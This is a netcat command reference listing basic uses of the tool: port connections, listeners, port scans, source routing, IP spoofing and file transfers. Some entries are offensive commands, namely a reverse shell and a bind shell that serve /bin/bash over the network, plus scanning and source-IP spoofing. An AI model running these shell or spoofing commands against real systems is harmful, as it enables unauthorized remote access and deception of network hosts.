Netcat Commands
===============
Netcat also know as the swiss army knife of network tools, provides a plethora of functions 
that can be used for good as well as motives that are negative. The following netcat command 
allow you to perform some of the basic functions of netcat. 

Connect to a port on a remote host			
----------------------------------

	nc remote_host <port>

	
Connect to multiple ports on a remote host	
------------------------------------------

	nc remote_host <port>…<port>
	
For example:

		nc www.somecompanyasanexample.com 21 25 80

		
Listen on a port for incoming connections	
-----------------------------------------

	nc –v –l –p <port>

	
Connect to remote host and serve a bash shell	
---------------------------------------------

	nc remote_ip <port> –e /bin/bash

Note that Netcat does not support the –e flag by default. To
make Netcat support the –e flag, it must be re-compiled with
the DGAPING_SECURITY_HOLE option.


Listen on a port and serve a bash shell upon connect	
----------------------------------------------------

	nc –v –l –p <port> –e /bin/bash

Note that Netcat does not support the –e flag by default. To
make Netcat support the –e flag, it must be re-compiled with
the DGAPING_SECURITY_HOLE option.


Port scan a remote host	
-----------------------

	nc –v –z remote_host <port>-<port>

Use the –i flag to set a delay interval:

	nc –i <seconds> -v –z remote_host <port>-<port>

	
Pipe command output to a netcat request	
---------------------------------------

	<command> | nc remote_host <port>

For example:
	echo "GET / HTTP/1.0
	[enter]
	[enter]
	"| nc www.somecompanyasanexample.com 80

	
Use source-routing to connect to a port on a remote host	
--------------------------------------------------------

	nc –g <gateway> remote_host <port>

Note: Up to eight hop points may be specified using the –g flag.
Use the –G flag to specify the source-routing pointer.
Spoof source IP
address	Use the –s flag to spoof the source IP address:
nc –s spoofed_ip remote_host port
This command will cause the remote host to respond back to the
spoofed IP address. The –s flag can be used along with most of
the commands presented in this table.


Transfer a file	
---------------
On the server host:
	nc –v –l –p <port> < <file>
On the client host:
	nc –v <server_host> <port> > <file>
	
It is also possible for the client host to listen on a port in order to
receive a file. To do this, run the following command 
on the client host:
	nc –v –l –p <port> > file
And run the following command on the server host:
	nc –v <client_host> <port> < file
	
To display progress bar during file transfer:

	cat backup.iso | pv -b | nc -l 3333	
	
,where pv - Pipe Viewer - is a terminal-based tool for monitoring the progress 
of data through a pipeline.
